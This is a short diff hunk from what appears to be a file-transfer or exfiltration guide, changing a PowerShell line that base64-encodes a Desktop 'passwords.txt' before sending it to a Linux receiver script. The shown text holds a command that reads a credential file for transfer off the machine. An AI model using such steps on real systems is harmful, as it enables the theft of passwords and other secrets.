@@ -227,7 +227,7 @@ python3 file_receiver.py --port <PORT>
 **Source Machine (Windows): Convert file to Base64 string**
 
 ```powershell
-$b64 = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\Users\%UserProfile%\Desktop\passwords.txt"))
+$b64 = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\Users\%USERPROFILE%\Desktop\passwords.txt"))
 ```
 
 **Source Machine (Windows): Send to Linux server**
